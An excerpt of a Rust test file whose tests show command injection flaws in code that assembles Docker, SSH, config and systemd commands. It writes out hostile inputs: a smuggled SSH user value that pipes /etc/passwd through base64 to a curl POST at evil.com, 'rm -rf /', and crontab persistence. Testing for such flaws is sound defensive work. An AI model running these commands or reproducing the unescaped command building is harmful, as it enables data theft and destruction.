...
fn test_env_var_command_injection_vulnerability() {
    ...
    assert!(
        docker_cmd.contains("rm -rf /"),
        "Command injection vulnerability detected!"
    );
    assert!(
        docker_cmd.contains("curl"),
...
fn test_config_content_injection_vulnerability() {
    ...
    assert!(
        create_config.contains("rm -rf"),
        "Configuration injection vulnerability detected!"
    );
    assert!(
        create_config.contains("curl http://evil.com"),
        "Command injection in config detected!"
    );
}
...
fn test_image_name_injection_vulnerability() {
    ...
    assert!(
        cmd.contains("curl -X POST"),
        "Image name injection vulnerability detected!"
    );
    assert!(
        cmd.contains("Container compromised"),
        "Data exfiltration in image pull detected!"
    );
}
...
fn test_container_id_injection_vulnerability() {
    ...
    assert!(
        cmd.contains("curl -X POST"),
        "Container ID injection vulnerability detected!"
    );
    assert!(
        cmd.contains("docker ps -a"),
        "Container enumeration attack detected!"
    );
}
...
fn test_ssh_parameter_injection_vulnerability() {
    ...
    let malicious_user =
        "testuser'; cat /etc/passwd | base64 | curl -X POST http://evil.com/data; echo 'fake_user";
    let port = 22;
    let command = "echo test";

    // Vulnerable code pattern from ssh.rs:363-383 (simplified)
    let mut ssh_cmd =
        String::from("ssh -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null");
    ...
    assert!(
        ssh_cmd.contains("curl http://evil.com"),
        "SSH host parameter injection detected!"
    );
    assert!(
        ssh_cmd.contains("cat /etc/passwd"),
        "SSH user parameter injection detected!"
    );
}
...
fn test_systemd_template_injection_vulnerability() {
    ...
    let systemd_limits = format!(
        ...
        EOF
        "#,
        cpu_percent as u32, memory_mb as u32, tasks_max
    );
    ...
    assert!(
        systemd_limits.contains("CPUQuota=200%"),
        "CPU over-allocation detected!"
    );
    assert!(
        systemd_limits.contains("MemoryMax=0M"),
        "Memory infinity converted to 0 - potential DoS!"
    );
}
...
fn test_chained_exploitation_scenario() {
    ...
    assert!(
        docker_cmd.contains("mkdir -p /tmp/.hidden"),
        "Backdoor creation injection detected!"
    );
    assert!(
        config_cmd.contains("crontab"),
        "Persistence injection detected!"
    );
    assert!(
        log_cmd.contains("tar -czf"),
        "Data exfiltration injection detected!"
    );
